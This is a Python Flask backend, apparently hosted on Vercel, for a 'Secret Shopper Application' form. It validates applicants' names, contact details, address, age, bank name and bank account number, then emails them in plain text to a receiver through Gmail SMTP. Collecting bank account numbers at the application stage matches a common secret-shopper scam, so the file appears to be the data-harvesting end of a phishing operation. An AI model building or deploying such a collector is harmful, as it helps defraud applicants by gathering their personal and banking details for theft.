from flask import Flask, request, jsonify
from flask_cors import CORS
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import re
import os

# Initialize Flask
app = Flask(__name__)
CORS(app)

# --- Email configuration from environment variables ---
SENDER_EMAIL = os.environ.get('SENDER_EMAIL')
SENDER_PASSWORD = os.environ.get('SENDER_PASSWORD')
RECEIVER_EMAIL = os.environ.get('RECEIVER_EMAIL')

# --- Validation functions ---
def validate_email(email):
    pattern = r'^[^\s@]+@[^\s@]+\.[^\s@]+$'
    return re.match(pattern, email) is not None

def validate_phone(phone):
    pattern = r'^[0-9+\-\s]{7,15}$'
    return re.match(pattern, phone) is not None

def validate_age(age):
    try:
        return int(age) >= 18
    except (ValueError, TypeError):
        return False

def validate_form_data(data):
    errors = []
    required_fields = [
        'first-name', 'last-name', 'email', 'phone', 'address',
        'city-state', 'zipcode', 'gender', 'age',
        'bank-name', 'bank-number'
    ]

    for field in required_fields:
        if not data.get(field) or not str(data.get(field)).strip():
            errors.append(f"{field.replace('-', ' ').title()} is required.")

    if errors:
        return errors

    if not validate_email(data.get('email')):
        errors.append("Invalid email format.")
    if not validate_phone(data.get('phone')):
        errors.append("Invalid phone number format.")
    if not validate_age(data.get('age')):
        errors.append("You must be at least 18 years old.")

    return errors


# --- Home route (to prevent “Not Found” on GET /) ---
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "message": "✅ Flask API is running successfully on Vercel!",
        "routes": {
            "sendmail": "POST /sendmail"
        }
    }), 200


# --- Send mail route ---
@app.route('/sendmail', methods=['POST'])
def send_mail_route():
    try:
        data = request.get_json()
    except Exception:
        return jsonify({"status": "error", "message": "Invalid JSON format"}), 400

    validation_errors = validate_form_data(data)
    if validation_errors:
        return jsonify({"status": "error", "message": " | ".join(validation_errors)}), 400

    if not all([SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL]):
        return jsonify({
            "status": "error",
            "message": "Email server not configured. Missing environment variables."
        }), 500

    try:
        subject = "New Secret Shopper Application"
        body = f"""
        New application details:

        Name: {data.get('first-name')} {data.get('last-name')}
        Email: {data.get('email')}
        Phone: {data.get('phone')}
        Age: {data.get('age')}
        Address: {data.get('address')}, {data.get('city-state')}, {data.get('zipcode')}
        Bank: {data.get('bank-name')} - {data.get('bank-number')}
        """

        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)

        return jsonify({
            "status": "success",
            "message": "Application sent successfully!",
            "redirect": "/thank_you.html"
        }), 200

    except Exception as e:
        print(f"EMAIL SENDING FAILED: {e}")
        return jsonify({"status": "error", "message": "Internal server error."}), 500
